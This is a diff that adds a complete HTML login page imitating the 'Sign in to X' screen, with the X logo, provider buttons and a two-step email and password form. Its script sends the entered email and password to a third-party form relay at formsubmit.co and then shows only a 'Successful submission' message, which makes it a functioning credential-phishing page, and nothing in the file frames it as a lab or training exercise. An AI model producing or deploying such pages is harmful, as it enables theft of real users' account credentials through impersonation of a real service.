@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 320px;
+            padding: 20px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 40px;
+            font-weight: 700;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 35px;
+        }
+        
+        .provider-btn {
+            width: 100%;
+            padding: 12px 0;
+            margin-bottom: 12px;
+            border-radius: 30px;
+            border: 1px solid #536471;
+            background: transparent;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.2s;
+        }
+        
+        .provider-btn:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+        
+        .provider-btn.google::before {
+            content: "G";
+            display: inline-block;
+            font-weight: bold;
+            font-size: 18px;
+            margin-right: 8px;
+            background: white;
+            color: black;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 24px;
+        }
+        
+        .provider-btn.apple::before {
+            content: "A";
+            display: inline-block;
+            font-weight: bold;
+            font-size: 18px;
+            margin-right: 8px;
+            background: white;
+            color: black;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 24px;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #2f3336;
+        }
+        
+        .divider-text {
+            padding: 0 10px;
+            color: #71767b;
+            font-size: 15px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px 10px 4px 10px;
+            background: transparent;
+            border: 1px solid #536471;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        .input-field:focus {
+            border-color: #1d9bf0;
+        }
+        
+        .input-label {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            color: #71767b;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+        
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: 12px;
+            transform: translateY(0);
+            font-size: 12px;
+        }
+        
+        .next-btn {
+            width: 100%;
+            padding: 12px 0;
+            border-radius: 30px;
+            background: white;
+            color: black;
+            border: none;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 20px;
+        }
+        
+        .next-btn:hover {
+            background-color: #e6e6e6;
+        }
+        
+        .next-btn:disabled {
+            background-color: #1d9bf0;
+            opacity: 0.5;
+            cursor: default;
+        }
+        
+        .forgot-password {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .signup-link {
+            color: #71767b;
+            font-size: 15px;
+            margin-top: 60px;
+            text-align: center;
+        }
+        
+        .signup-link a {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 40px 0;
+            display: none;
+        }
+        
+        .success-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #1d9bf0;
+        }
+        
+        .success-text {
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        .password-container {
+            display: none;
+        }
+        
+        .email-display {
+            color: #1d9bf0;
+            margin-bottom: 10px;
+            font-size: 14px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">𝕏</div>
+        
+        <div class="login-form">
+            <div class="title">Sign in to X</div>
+            
+            <button class="provider-btn google">Sign in with Google</button>
+            <button class="provider-btn apple">Sign in with Apple</button>
+            
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">or</div>
+                <div class="divider-line"></div>
+            </div>
+            
+            <div class="email-container">
+                <div class="input-group">
+                    <input type="email" id="email" class="input-field" placeholder=" " autocomplete="email">
+                    <label for="email" class="input-label">Email</label>
+                </div>
+                
+                <button id="nextBtn" class="next-btn" disabled>Next</button>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <div class="password-container">
+                <div class="email-display" id="emailDisplay"></div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" class="input-field" placeholder=" ">
+                    <label for="password" class="input-label">Password</label>
+                </div>
+                
+                <button id="submitBtn" class="next-btn">Submit</button>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <div class="success-message">
+                <div class="success-icon">✓</div>
+                <div class="success-text">Successful submission</div>
+            </div>
+            
+            <div class="signup-link">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const nextBtn = document.getElementById('nextBtn');
+            const submitBtn = document.getElementById('submitBtn');
+            const emailContainer = document.querySelector('.email-container');
+            const passwordContainer = document.querySelector('.password-container');
+            const successMessage = document.querySelector('.success-message');
+            const emailDisplay = document.getElementById('emailDisplay');
+            
+            // Enable next button when email is entered
+            emailInput.addEventListener('input', function() {
+                nextBtn.disabled = !this.value.trim();
+            });
+            
+            // Handle "Next" button click
+            nextBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                emailDisplay.textContent = email;
+                emailContainer.style.display = 'none';
+                passwordContainer.style.display = 'block';
+            });
+            
+            // Handle "Submit" button click
+            submitBtn.addEventListener('click', function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (!password) {
+                    alert('Please enter your password');
+                    return;
+                }
+                
+                // Submit the form to FormSubmit
+                const formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                
+                fetch('https://formsubmit.co/ajax/example@email.com', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        passwordContainer.style.display = 'none';
+                        successMessage.style.display = 'block';
+                    } else {
+                        alert('Submission failed. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                });
+            });
+            
+            // Press Enter to submit
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && this.value.trim()) {
+                    nextBtn.click();
+                }
+            });
+            
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && this.value.trim()) {
+                    submitBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
